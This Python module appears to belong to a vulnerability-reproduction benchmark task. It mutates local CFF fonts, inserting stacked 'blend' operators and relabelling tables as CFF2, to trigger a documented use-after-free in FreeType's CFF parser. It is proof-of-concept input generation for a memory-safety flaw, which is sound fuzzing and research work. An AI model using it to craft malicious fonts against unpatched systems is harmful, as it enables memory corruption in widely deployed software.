"""CG-16d / arvo:368（freetype2 ftfuzzer）CFF 种子变异构造器。

**缺陷**：`cff_blend_doBlend` 连续多个 `blend` 算子时，realloc 后没有修正
`parser->stack` 指向 `subFont->blend_stack` 的指针 → UAF
（官方栈：`cff_parse_num cffparse.c:440` ← `cff_parser_run:1543` ←
`cff_load_private_dict cffload.c:1879`）。

**本模块做什么**：拿本地现成字体当种子（保持 sfnt 表目录/头部完整），
只改 CFF 表内部的字节，重点是 Private DICT 与 CharStrings 区，
尝试把解析器引到 blend 处理分支上。所有变异都由 `seed` 决定，可复现。

**已知限制（如实写）**：本机 355 个字体里 **CFF2（可变字体）为 0 个**，
46 个是 CFF1。CFF2 才是 blend 算子的原生场景，所以这里是在 CFF1 上做
"把 blend 序列硬塞进 Private DICT" 的越界尝试，命中率不可保证。
"""
from __future__ import annotations

import random
import struct
from pathlib import Path

SEED_ROOTS = ("/usr/share/fonts", "/snap")
CFF_TABLE_TAG = b"CFF "
BLEND_OP = 0x17          # CFF2 'blend' 算子
VSINDEX_OP = 0x0F

FIELDS = {
    "seed_index": "int, 选哪个种子字体（按 discover_seeds() 的顺序）",
    "seed": "int, 变异随机种子（同参数同结果）",
    "flips": "int(1..64), 在 CFF 表内随机改写的字节数（默认 8）",
    "blend_runs": "int(0..8), 往 Private DICT 区插入的 blend 序列条数（默认 2）",
    "blend_args": "int(2..40), 每条 blend 序列的 numBlends 值（默认 8）",
    "mode": "blend(默认) | tag_flip(把 CFF 标签改 CFF2) | tag_flip_header(再改表头 major=2)",
}


class CffResult:
    """构造结果（普通类：模块可能按文件路径加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "freetype_cff"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def discover_seeds(roots=SEED_ROOTS) -> list[Path]:
    """找出本地所有 sfnt 字体（.otf/.ttf），按路径排序保证可复现。"""
    out: list[Path] = []
    for r in roots:
        base = Path(r)
        if not base.exists():
            continue
        for ext in ("*.otf", "*.OTF", "*.ttf", "*.TTF"):
            out += [p for p in base.rglob(ext) if p.is_file()]
    return sorted(set(out))


def sfnt_tables(data: bytes) -> dict[str, tuple[int, int]]:
    """读 sfnt 表目录，返回 tag -> (offset, length)。非 sfnt 返回空。"""
    if len(data) < 12 or data[:4] not in (b"OTTO", b"\x00\x01\x00\x00", b"true"):
        return {}
    (num,) = struct.unpack(">H", data[4:6])
    out: dict[str, tuple[int, int]] = {}
    for i in range(num):
        off = 12 + 16 * i
        if off + 16 > len(data):
            break
        tag = data[off:off + 4].decode("latin-1")
        toff, tlen = struct.unpack(">II", data[off + 8:off + 16])
        if toff + tlen <= len(data):
            out[tag] = (toff, tlen)
    return out


def cff_seeds(roots=SEED_ROOTS) -> list[Path]:
    """只保留带 CFF / CFF2 表的字体（没有 CFF 表的走不到 cff 解析）。"""
    keep = []
    for p in discover_seeds(roots):
        try:
            head = p.read_bytes()[:4096]
        except OSError:
            continue
        if b"CFF2" in head or b"CFF " in head:
            keep.append(p)
    return keep


def _blend_sequence(rng: random.Random, num_blends: int) -> bytes:
    """构造一段"多个 blend 连续出现"的字节。

    CFF2 blend：num(1B, 操作数个数说明) ... 这里用编码：numBlends 作为整数操作数
    （0..107 用单字节 139+numBlends），随后若干 data 操作数，最后 BLEND_OP。
    连做两次，制造"同一 parser 反复 push/realloc blend_stack"的入口。
    """
    seq = bytearray()
    for _ in range(2):
        n = max(2, min(num_blends, 40))
        seq.append(139 + n)                      # 整数操作数 n
        for _ in range(n):
            seq.append(139 + rng.randrange(0, 40))   # 一些数据操作数
        seq.append(BLEND_OP)
    return bytes(seq)



def _patch_tag_to_cff2(data: bytearray) -> tuple[bool, str]:
    """把 sfnt 表目录里的 'CFF ' 标签改成 'CFF2'（等长，不动任何偏移）。

    freetype 的驱动是按**表标签**选 CFF / CFF2 解析路径的，所以只改标签就能
    让 CFF1 的字节被当成 CFF2 来解析——这正是"本地没有 CFF2 种子"时能造出的
    最接近 blend 分支的输入。
    """
    if len(data) < 12:
        return False, "太短"
    (num,) = struct.unpack(">H", data[4:6])
    for i in range(num):
        off = 12 + 16 * i
        if off + 16 > len(data):
            break
        if data[off:off + 4] == b"CFF ":
            data[off:off + 4] = b"CFF2"
            return True, "tag_flipped"
    return False, "no_cff_table"


def _set_cff_major(data: bytearray, toff: int, major: int) -> None:
    """CFF 表头的 major version 字节（CFF2 是 2，hdrSize 5）。"""
    if toff + 4 < len(data):
        data[toff] = major
        if major == 2:
            data[toff + 2] = 5          # hdrSize

def build(fields: dict, *, roots=SEED_ROOTS) -> CffResult:
    fields = dict(fields or {})
    seeds = cff_seeds(roots)
    if not seeds:
        return CffResult(False, reason="本地没有带 CFF/CFF2 表的字体种子")
    try:
        idx = int(fields.get("seed_index", 0))
        rng_seed = int(fields.get("seed", 0))
        flips = int(fields.get("flips", 8))
        runs = int(fields.get("blend_runs", 2))
        args = int(fields.get("blend_args", 8))
    except (TypeError, ValueError):
        return CffResult(False, reason="seed_index/seed/flips/blend_runs/blend_args 必须是整数")
    if not 0 <= idx < len(seeds):
        return CffResult(False, reason=f"seed_index 越界（0..{len(seeds)-1}）: {idx}")
    if not 0 <= flips <= 64:
        return CffResult(False, reason=f"flips 越界（0..64）: {flips}")
    if not 0 <= runs <= 8:
        return CffResult(False, reason=f"blend_runs 越界（0..8）: {runs}")

    seed_path = seeds[idx]
    try:
        data = bytearray(seed_path.read_bytes())
    except OSError as exc:
        return CffResult(False, reason=f"读种子失败: {exc}")
    tables = sfnt_tables(data)
    if not tables:
        return CffResult(False, reason="种子不是可解析的 sfnt")
    tag = "CFF2" if "CFF2" in tables else ("CFF " if "CFF " in tables else "")
    if not tag:
        return CffResult(False, reason="种子没有 CFF/CFF2 表")
    toff, tlen = tables[tag]
    # CFF 头 4 字节（major/minor/hdrSize/offSize）+ 索引区放前面，从中间开始动
    lo = toff + max(4, tlen // 8)
    hi = toff + tlen
    if hi - lo < 16:
        return CffResult(False, reason="CFF 表太小，无法安全变异")

    rng = random.Random(rng_seed)
    used = {"seed_index": idx, "seed_file": str(seed_path), "table": tag,
            "seed": rng_seed, "flips": flips, "blend_runs": runs, "blend_args": args}

    # A) 把 blend 序列写进 CFF 表中部（Private DICT 附近），不碰表目录/头
    for k in range(runs):
        seq = _blend_sequence(rng, args)
        pos = lo + rng.randrange(0, max(1, (hi - lo) - len(seq)))
        data[pos:pos + len(seq)] = seq
    # B) 少量随机字节改写，制造解析器走不同分支
    for _ in range(flips):
        pos = rng.randrange(lo, hi)
        data[pos] = rng.randrange(0, 256)

    # C) 模式 2/3：改标签 / 改表头版本，把 CFF1 字节送进 CFF2 解析路径
    mode = str(fields.get("mode") or "blend")
    used["mode"] = mode
    if mode in ("tag_flip", "tag_flip_header"):
        ok_tag, why = _patch_tag_to_cff2(data)
        used["tag_patch"] = why
        if not ok_tag:
            return CffResult(False, reason=f"没法把 {tag} 改成 CFF2: {why}")
        if mode == "tag_flip_header":
            _set_cff_major(data, toff, 2)
            used["cff_major"] = 2

    known = set(FIELDS)
    dropped = [{"field": k, "reason": "freetype_cff 构造器不识别该字段"}
               for k in fields if k not in known]
    return CffResult(True, bytes(data), used, dropped, "")


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    seeds = cff_seeds()
    print("CFF seeds:", len(seeds))
    r = build({"seed_index": 0, "seed": 1})
    print(r.to_record())
